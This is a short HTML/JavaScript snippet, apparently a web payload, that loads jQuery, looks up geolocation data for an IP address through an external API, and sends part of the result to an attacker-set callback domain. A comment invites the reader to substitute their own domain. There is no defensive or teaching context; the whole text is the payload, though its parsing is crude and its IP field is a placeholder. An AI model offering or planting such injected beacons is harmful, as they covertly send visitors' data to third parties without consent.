<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.2.1.min.js"></script>
<script>
$(document).ready(function(){
   setTimeout(function(){ $.getJSON('//geoip.nekudo.com/api/<ip address>', function(data) {
  dt = JSON.stringify(data, null, 2);
  i = dt.split(':'); p = i[i.length - 1].split('"'); t = p[1]
  $.post('yourdomaincallback'+t,t,null); //change this line to your domain callback..
 }) },12);
});
</script>
